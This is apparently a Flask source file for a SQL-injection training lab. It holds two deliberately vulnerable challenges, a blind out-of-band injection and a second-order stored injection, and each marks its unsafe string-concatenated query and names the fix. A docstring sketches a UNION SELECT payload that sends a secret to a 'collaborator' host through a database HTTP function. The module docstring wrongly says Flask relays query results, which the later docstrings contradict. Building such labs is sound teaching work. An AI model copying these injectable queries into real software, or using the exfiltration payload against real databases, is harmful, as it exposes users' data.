"""
challenges/phase3.py, Phase 3, "Greed Island" (Specialization).

Task 3.1 lands the first card: p3_1 "The Spell Card", an out-of-band (OOB)
SQL injection against real MariaDB (core/db.mysql_conn). Unlike every floor
in Phases 1-2, this challenge's own HTTP response gives zero data-dependent
signal, same generic message no matter what the injected query returns, or
whether it errors at all. The only way to recover anything is out-of-band:
the Flask route itself (not MariaDB, see docs/oob-spike.md's "Decision")
relays whatever the query returned onward as a real, separate outbound HTTP
call to the `collaborator` lab service, and a tester reads the confirmation
off collaborator's own capture feed instead of this route's response.

Later Phase-3 tasks (p3_2) append their routes to this same blueprint, keep
each challenge's route + helpers scoped to its own block, same
append-only-friendly convention as phase1.py / phase2.py.
"""

from __future__ import annotations

import threading

import requests
from flask import Blueprint, Response, redirect, render_template, request, url_for

from core.db import mysql_conn

# app.py's blueprint-loading loop imports `challenges.phase3` looking for an
# attribute named `phase3_bp`; `bp` is the conventional short name used
# inside this module and elsewhere in the brief. Both names point at the
# same object so either import style works.
bp = Blueprint("phase3", __name__)
phase3_bp = bp

# Hostname of the collaborator service on the docker-compose network (see
# docker-compose.yml's `collaborator` service and docs/oob-spike.md). Only
# reachable from other containers, never from a student's browser directly.
# That's exactly why /p3/spellcard/captures below exists as a server-side
# proxy instead of asking the template to fetch this URL itself.
COLLABORATOR_BASE = "http://collaborator"


# ---------------------------------------------------------------------------
# p3_1, The Spell Card
# ---------------------------------------------------------------------------

def _run_card_query(card: str) -> None:
    """Run the vulnerable card lookup in a detached background thread.

    The result is intentionally discarded — this application never relays
    it anywhere.  Running in a background thread keeps the HTTP response's
    timing completely independent of query execution time, which closes the
    time-based in-band channel (an injected SLEEP delays only this thread,
    not the response the caster is watching).

    The OOB channel this floor teaches is not wired by application code at
    all: an injected payload that calls the http_get() UDF causes
    *MariaDB's own process* to originate the outbound HTTP request, with no
    involvement from Flask.  The application is genuinely oblivious to
    whether that call ever happens.
    """
    conn = mysql_conn("p3_spellcard")
    try:
        with conn.cursor() as cur:
            # VULN: string concat, raw query param spliced directly into
            # the SQL text inside a single-quoted string literal, no
            # escaping/parameterization whatsoever. Use a parameterized
            # query (cur.execute(q, (card,))) instead; left unescaped here
            # on purpose, this is the challenge's sink.
            q = f"SELECT effect FROM cards WHERE id='{card}'"
            cur.execute(q)
            cur.fetchone()  # result discarded — Flask never sees it
    except Exception:
        # Fully blind by design: every DB error is swallowed silently.
        pass
    finally:
        conn.close()


@bp.route("/p3/spellcard", methods=["GET"])
def p3_spellcard():
    """A Greed Island spell-card reader. Deliberately, fully blind.

    The HTTP response is identical no matter what `card` contains: whether
    the card exists, whether the lookup returns one row or fifty, or whether
    the underlying query raises an exception.  Nothing data-dependent ever
    reaches the response.

    The query itself is classically vulnerable (`card` is spliced into a
    single-quoted string context with no escaping), but the result is
    thrown away by the application.  There is no boolean, error, UNION, or
    timing signal anywhere in the response.  The only way to extract data
    is to make the *database engine itself* originate an outbound network
    call carrying the result — out-of-band, on a channel this application
    never touches.

    The http_get() UDF (compiled into the MariaDB image, registered in the
    seed SQL) is that primitive: an injected UNION SELECT that calls
    http_get(CONCAT('http://collaborator/...', secret)) causes MariaDB's
    own process to fire a real HTTP GET to collaborator, carrying the
    exfiltrated value in the URL path.  The application has no relay code
    and no knowledge of collaborator; the outbound call comes from the DB
    tier, exactly as it does in a real OOB SQLi engagement.
    """
    card = request.args.get("card", "")

    if card:
        # daemon=True: a slow/hung UDF call (e.g. injected SLEEP, or a
        # UDF hitting an unreachable host) never blocks process shutdown.
        threading.Thread(
            target=_run_card_query, args=(card,), daemon=True
        ).start()

    # Fully blind response: identical regardless of `card`.
    return render_template("p3_spellcard.html", card=card)


@bp.route("/p3/spellcard/captures", methods=["GET"])
def p3_spellcard_captures():
    """Server-side proxy for collaborator's GET /captures.

    collaborator is only reachable from other containers on the compose
    network by its service name (`collaborator`), docker-compose.yml
    `expose`s it internally only, with no published host port, so a
    student's browser can't fetch collaborator's /captures directly. This
    route does that fetch server-side (where the `collaborator` hostname
    does resolve) and hands the JSON straight back, letting the portal-side
    template poll a same-origin URL instead.
    """
    try:
        resp = requests.get(f"{COLLABORATOR_BASE}/captures", timeout=3)
        return Response(
            resp.content,
            status=resp.status_code,
            mimetype="application/json",
        )
    except Exception as exc:
        return Response(
            f'{{"error": {str(exc)!r}}}',
            status=502,
            mimetype="application/json",
        )


# ---------------------------------------------------------------------------
# p3_2, The Cursed Card
# ---------------------------------------------------------------------------
#
# A genuinely second-order (stored) SQL injection, split across two
# deliberately separate routes so the "safe on write, dangerous on a later
# read" shape is the real mechanism, not a relabeled first-order bug:
#
#   Step 1, /p3/cursedcard/inscribe stores whatever text a player submits
#   as a card's `inscription` via a properly parameterized INSERT. A raw
#   SQLi payload dropped here is stored verbatim as an inert string: no
#   error, no effect, nothing observable happens. This route's own code
#   never builds a query out of `inscription` at all, it only ever
#   supplies it as a placeholder value.
#
#   Step 2, /p3/cursedcard/report is a *separate* route, exercised on its
#   own schedule, that later reads a row's `inscription` back out of
#   MariaDB (itself via a safe, parameterless SELECT) and splices that
#   already-stored value, unescaped, into a brand-new query. That is where
#   a dormant payload "wakes up", the student never sends this route any
#   text directly; every byte in its eventual query traces back to
#   whatever /inscribe already persisted.
#
# `player_cards` is what both routes touch; the hidden `vault_cards` table
# (this floor's flag, in `vault_cards.secret`) is never touched by either
# route's own legitimate query, only reachable by riding an `inscription`
# value stored in Step 1 into a UNION SELECT once Step 2's concatenation
# runs.

_CURSED_SEED_ROWS = (
    ("Biscuit", "Handmade parchment card, smells faintly of tea leaves."),
    ("Goreinu", "A card traded three times before it reached this deck."),
)


def _fetch_player_cards(cur) -> list[dict]:
    """Safe, parameterless listing of every currently inscribed card."""
    cur.execute("SELECT id, owner, inscription FROM player_cards ORDER BY id")
    return cur.fetchall()


@bp.route("/p3/cursedcard", methods=["GET"])
def p3_cursedcard():
    """The Cursed Card console: shows the current deck and the inscribe
    form. No query on this route ever touches request-supplied data,
    it's a plain, safe listing."""
    conn = mysql_conn("p3_cursed")
    try:
        with conn.cursor() as cur:
            cards = _fetch_player_cards(cur)
    finally:
        conn.close()

    return render_template(
        "p3_cursedcard.html", cards=cards, report=None, report_error=None, inscribed=False,
    )


@bp.route("/p3/cursedcard/inscribe", methods=["POST"])
def p3_cursedcard_inscribe():
    """Step 1, safely store a new card inscription.

    Genuinely safe: both `owner` and `inscription` reach MariaDB only as
    bound parameters, never spliced into the SQL text itself. A raw SQLi
    payload submitted as `inscription` is stored as an ordinary string,
    same as any other text, and this route's response never varies based
    on what that text contains. Nothing dangerous happens here; the point
    of this step is that it *looks and behaves* completely safe, because
    it is.
    """
    owner = request.form.get("owner", "").strip() or "anonymous"
    inscription = request.form.get("inscription", "")

    conn = mysql_conn("p3_cursed")
    try:
        with conn.cursor() as cur:
            # SAFE: parameterized insert. `inscription` (and `owner`) are
            # bound placeholder values, never concatenated into SQL text;
            # whatever they contain, including a full injection payload,
            # is stored verbatim as inert data. No error, no effect, here.
            cur.execute(
                "INSERT INTO player_cards (owner, inscription) VALUES (%s, %s)",
                (owner, inscription),
            )
            cards = _fetch_player_cards(cur)
    finally:
        conn.close()

    return render_template(
        "p3_cursedcard.html", cards=cards, report=None, report_error=None, inscribed=True,
    )


@bp.route("/p3/cursedcard/report", methods=["GET"])
def p3_cursedcard_report():
    """Step 2, the appraiser's report. Reads the most recently inscribed
    card back out of the database and re-checks it, on the appraiser's own
    initiative, days after the fact in the game's fiction. This route
    takes no input from the request at all, every value it acts on was
    already sitting in `player_cards` before this request began.
    """
    conn = mysql_conn("p3_cursed")
    report_rows: list[dict] = []
    report_error = None
    latest = None
    try:
        with conn.cursor() as cur:
            # Safe: no request-controlled data anywhere in this SELECT,
            # just "what's the most recently inscribed card."
            cur.execute(
                "SELECT id, owner, inscription FROM player_cards ORDER BY id DESC LIMIT 1"
            )
            latest = cur.fetchone()

            if latest is not None:
                stored_inscription = latest["inscription"]
                try:
                    # VULN: string concat, `stored_inscription` was never
                    # typed into *this* request. It's a value this same
                    # app already wrote to MariaDB earlier, via a properly
                    # parameterized INSERT (see /p3/cursedcard/inscribe
                    # above), now read back and spliced unescaped into a
                    # brand-new query. Use a parameterized query
                    # (cur.execute(q, (stored_inscription,))) instead;
                    # left unescaped here on purpose, this is the
                    # challenge's sink. This is the entire second-order
                    # shape: the write path was safe, this *separate* read
                    # path is not, and the payload only executes here,
                    # later, once this route happens to run.
                    q = (
                        "SELECT id, owner, inscription FROM player_cards "
                        f"WHERE inscription = '{stored_inscription}'"
                    )
                    cur.execute(q)
                    report_rows = cur.fetchall()
                except Exception as exc:
                    report_error = str(exc)

            cards = _fetch_player_cards(cur)
    finally:
        conn.close()

    return render_template(
        "p3_cursedcard.html",
        cards=cards,
        report=report_rows,
        report_error=report_error,
        latest=latest,
        inscribed=False,
    )


@bp.route("/p3/cursedcard/reset", methods=["GET"])
def p3_cursedcard_reset():
    """Clear `player_cards` back to its two clean seeded rows, so this
    lesson can be replayed without restarting the whole stack. Uses DELETE
    rather than TRUNCATE so this challenge's restricted DB user needs only
    DML grants (no DROP privilege, which TRUNCATE requires) on its own
    isolated database."""
    conn = mysql_conn("p3_cursed")
    try:
        with conn.cursor() as cur:
            cur.execute("DELETE FROM player_cards")
            cur.executemany(
                "INSERT INTO player_cards (owner, inscription) VALUES (%s, %s)",
                _CURSED_SEED_ROWS,
            )
    finally:
        conn.close()

    return redirect(url_for("phase3.p3_cursedcard"))
